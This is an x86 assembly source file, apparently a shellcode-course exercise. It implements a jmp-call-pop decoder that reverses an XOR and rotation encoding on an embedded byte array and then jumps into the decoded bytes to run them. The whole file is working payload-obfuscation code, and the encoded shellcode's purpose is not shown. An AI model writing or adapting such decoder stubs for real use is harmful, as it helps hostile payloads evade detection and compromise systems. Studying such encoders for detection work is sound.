;
; Filename: decoder_rotn_xor.asm
; Author:   Fernando Benedictti
;

global _start			

segment .text
_start:
  xor eax, eax
  xor ebx, ebx
  xor ecx, ecx
  jmp short shellcode

shellcode_address:
  pop esi
  mov ah, byte [esi]
  mov al, byte [esi + 1]
  mov edi, esi
  mov edx, esi
  inc esi

decoder:
  dec ah
  jz exec_shellcode
  inc esi
  inc edi
  mov bl, byte [esi]
  mov cl, byte [edi]
  xor bl, cl
  sub bl, al
  jns decoded_value
  add ebx, 0xff
  add ebx, 0x1
  xor bh, bh

decoded_value:
  mov byte [edi-1], bl
  jmp decoder

exec_shellcode:
  jmp edx

shellcode:
  call shellcode_address
  shellcode_encoded: db 0x52, 0x14, 0x6a, 0x10, 0x7c, 0xe1, 0x3a, 0x44, 0x51, 0x3e, 0x93, 0xf5, 0x8b, 0x9e, 0xe0, 0xf6, 0x6b, 0x9e, 0x7f, 0xeb, 0x41, 0xdc, 0xd0, 0xae, 0xb9, 0xd6, 0xaa, 0x39, 0x2c, 0x39, 0x2c, 0x56, 0x2a, 0x11, 0x32, 0x4c, 0x5a, 0x37, 0x4d, 0x28, 0xb5, 0x40, 0x3e, 0x1a, 0x7f, 0x15, 0x88, 0x7d, 0x9c, 0x08, 0x4d, 0x90, 0x55, 0x43, 0x3d, 0x6e, 0x02, 0xe3, 0x77, 0x2a, 0xa7, 0xab, 0xd5, 0xca, 0xa6, 0xc0, 0xbc, 0xff, 0xbc, 0x3b, 0x47, 0x3b, 0x78, 0x0e, 0x73, 0xf1, 0x6c, 0x9b, 0xce, 0x53, 0x8d, 0x6c, 0xf8
